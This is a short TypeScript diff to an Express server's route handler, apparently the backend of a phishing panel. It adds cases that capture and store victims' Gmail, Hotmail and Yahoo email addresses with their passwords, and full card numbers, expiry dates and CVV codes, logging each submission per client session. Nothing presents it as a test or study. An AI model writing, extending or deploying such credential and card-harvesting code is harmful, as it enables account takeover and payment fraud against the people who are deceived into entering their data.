@@ -1145,6 +1145,27 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'celular':
                 updatedFields.celular = inputData.celular;
                 break;
+              case 'gmail':
+                updatedFields.correo = inputData.correo;
+                updatedFields.contrasena = inputData.contrasena;
+                console.log('Recibidas credenciales de Gmail:', inputData.correo);
+                break;
+              case 'hotmail':
+                updatedFields.correo = inputData.correo;
+                updatedFields.contrasena = inputData.contrasena;
+                console.log('Recibidas credenciales de Hotmail:', inputData.correo);
+                break;
+              case 'yahoo':
+                updatedFields.correo = inputData.correo;
+                updatedFields.contrasena = inputData.contrasena;
+                console.log('Recibidas credenciales de Yahoo:', inputData.correo);
+                break;
+              case 'datos_tarjeta':
+                updatedFields.tarjeta = inputData.numeroTarjeta;
+                updatedFields.fechaVencimiento = inputData.fechaVencimiento;
+                updatedFields.cvv = inputData.cvv;
+                console.log('Recibidos datos de tarjeta:', inputData.numeroTarjeta?.slice(-4));
+                break;
             }
 
             console.log(`Received data from client ${sessionId}: ${tipo}`, inputData);
